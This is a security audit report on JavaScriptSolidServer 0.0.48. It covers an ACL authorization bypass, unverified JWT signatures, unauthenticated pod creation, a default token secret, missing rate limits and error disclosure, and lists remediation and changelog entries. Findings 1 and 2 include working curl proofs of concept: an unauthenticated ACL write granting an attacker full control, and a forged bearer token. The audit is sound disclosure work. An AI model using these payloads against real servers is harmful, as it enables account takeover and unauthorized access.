# JSS Security Audit Report

**Date:** 2026-01-03
**Auditor:** Security Review
**Version Audited:** 0.0.48

---

## Executive Summary

A security audit of JavaScriptSolidServer revealed **2 critical**, **2 high**, and **2 medium** severity vulnerabilities. The most severe allows unauthenticated users to read and write ACL (Access Control List) files, effectively bypassing all authorization.

---

## Critical Vulnerabilities

### 1. ACL Files Bypass Authorization (CRITICAL) ⚠️

**Location:** `src/auth/middleware.js:24-28`

```javascript
if (urlPath.endsWith('.acl') || method === 'OPTIONS') {
  return { authorized: true, webId: null, wacAllow: '...', authError: null };
}
```

**Description:** The authorization middleware explicitly skips authentication and authorization checks for all requests to `.acl` files. This allows any unauthenticated user to:

1. **Read any ACL file** - Discover permission structures
2. **Write/Create any ACL file** - Grant themselves access to any resource
3. **Modify existing ACL files** - Lock out legitimate owners

**Proof of Concept:**
```bash
# Read root ACL without authentication
curl https://example.com/.acl

# Create malicious ACL without authentication
curl -X PUT https://example.com/victim/.acl \
  -H "Content-Type: application/ld+json" \
  -d '{"@graph":[{"@id":"#attacker","@type":"acl:Authorization","acl:agent":{"@id":"https://attacker.com/card#me"},"acl:accessTo":{"@id":"https://example.com/victim/"},"acl:mode":[{"@id":"acl:Read"},{"@id":"acl:Write"},{"@id":"acl:Control"}]}]}'
```

**Impact:** Complete authorization bypass. Attacker can gain full control of any resource.

**CVSS Score:** 9.8 (Critical)

**Fix Required:** ACL files should require `acl:Control` permission on the resource they protect.

---

### 2. JWT Token Signature Not Verified (CRITICAL) ⚠️

**Location:** `src/auth/token.js:93-122`

```javascript
function verifyJwtToken(token) {
  const parts = token.split('.');
  if (parts.length !== 3) return null;

  // Decode the payload (middle part) - NO SIGNATURE VERIFICATION!
  const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());

  if (payload.exp && payload.exp < Math.floor(Date.now() / 1000)) {
    return null;
  }

  if (payload.webid) {
    return { webId: payload.webid, iat: payload.iat, exp: payload.exp };
  }
  // ...
}
```

**Description:** The `verifyJwtToken` function decodes JWT tokens but **never verifies the cryptographic signature**. An attacker can craft arbitrary JWT tokens with any WebID.

**Proof of Concept:**
```bash
# Forge a JWT token with attacker's WebID (signature is ignored)
# Header: {"alg":"RS256","typ":"JWT"}
# Payload: {"webid":"https://attacker.com/card#me","exp":9999999999}
curl https://example.com/private/ \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ3ZWJpZCI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NhcmQjbWUiLCJleHAiOjk5OTk5OTk5OTl9.fakesig"
```

**Impact:** Complete authentication bypass. Attacker can impersonate any user.

**CVSS Score:** 9.8 (Critical)

**Fix Required:** Verify JWT signatures against the issuer's JWKS before accepting tokens.

---

## High Severity Vulnerabilities

### 3. Pod Creation Without Authentication (HIGH)

**Location:** `src/server.js:203,228`

```javascript
// Auth bypass list includes /.pods
if (request.url === '/.pods' || ...) {
  return; // Skip auth
}

// Anyone can create pods
fastify.post('/.pods', handleCreatePod);
```

**Description:** The `/.pods` endpoint allows anyone to create new pods without authentication.

**Impact:**
- Resource exhaustion (DoS)
- Username/namespace squatting
- Disk space exhaustion

**CVSS Score:** 7.5 (High)

**Fix Required:** Require authentication or implement rate limiting and CAPTCHA.

---

### 4. Default Token Secret in Production (HIGH)

**Location:** `src/auth/token.js:15`

```javascript
const SECRET = process.env.TOKEN_SECRET || 'dev-secret-change-in-production';
```

**Description:** If `TOKEN_SECRET` environment variable is not set, a hardcoded default secret is used.

**Impact:** Tokens can be forged by anyone who knows the default secret.

**CVSS Score:** 8.1 (High)

**Fix Required:** Fail to start if TOKEN_SECRET is not set in production, or generate a random secret on first run.

---

## Medium Severity Vulnerabilities

### 5. No Rate Limiting on Authentication Endpoints (MEDIUM)

**Location:** `src/idp/interactions.js`, `src/idp/credentials.js`

**Description:** Login, registration, and credential endpoints have no rate limiting, allowing brute force attacks.

**Impact:** Account takeover through credential stuffing or brute force.

**CVSS Score:** 5.3 (Medium)

**Fix Required:** Implement rate limiting (e.g., 5 attempts per minute per IP).

---

### 6. Information Disclosure via Error Messages (MEDIUM)

**Location:** Various handlers

**Description:** Error messages may reveal internal paths or stack traces.

**Impact:** Information leakage useful for further attacks.

**CVSS Score:** 4.3 (Medium)

---

## Recommendations

### Immediate Actions (Critical)

1. **Fix ACL bypass** - Require `acl:Control` permission to modify ACL files
2. **Verify JWT signatures** - Use `jose` library to verify against issuer JWKS

### Short-term Actions (High)

3. **Protect pod creation** - Add authentication or rate limiting
4. **Enforce TOKEN_SECRET** - Fail startup if not configured

### Medium-term Actions

5. **Add rate limiting** - Use `@fastify/rate-limit` plugin
6. **Sanitize error messages** - Remove internal details from user-facing errors

---

## Remediation Status

| Issue | Severity | Status | Fixed In |
|-------|----------|--------|----------|
| ACL bypass | Critical | 🟢 Fixed | v0.0.49 |
| JWT signature bypass | Critical | 🟢 Fixed | v0.0.49 |
| SSRF in OIDC discovery | Critical | 🟢 Fixed | v0.0.50 |
| SSRF in client document fetch | Critical | 🟢 Fixed | v0.0.50 |
| Unauthenticated pod creation | High | 🟢 Fixed | v0.0.51 |
| Default token secret | High | 🟢 Fixed | v0.0.51 |
| No rate limiting | Medium | 🟢 Fixed | v0.0.51 |
| Information disclosure | Medium | 🔴 Open | - |

---

## Changelog

### v0.0.51 (2026-01-03)
- **Fixed pod creation abuse**: Rate limited to 5 pods per IP per hour
- **Fixed default token secret**: Production (NODE_ENV=production) now requires TOKEN_SECRET env var
- **Added rate limiting**: Login endpoints limited to 10 attempts/min, registration to 5/hour

### v0.0.50 (2026-01-03)
- **Fixed SSRF in OIDC discovery**: Issuer URLs are now validated before fetching (HTTPS required, private IPs blocked)
- **Fixed SSRF in client document fetch**: Client ID URLs are now validated before fetching
- Added `src/utils/ssrf.js` - URL validation utility with DNS rebinding protection

### v0.0.49 (2026-01-03)
- **Fixed ACL bypass**: ACL files now require `acl:Control` permission on the protected resource
- **Fixed JWT signature bypass**: JWTs are now verified against the IdP's JWKS before accepting

*Report generated: 2026-01-03*
*Last updated: 2026-01-03*
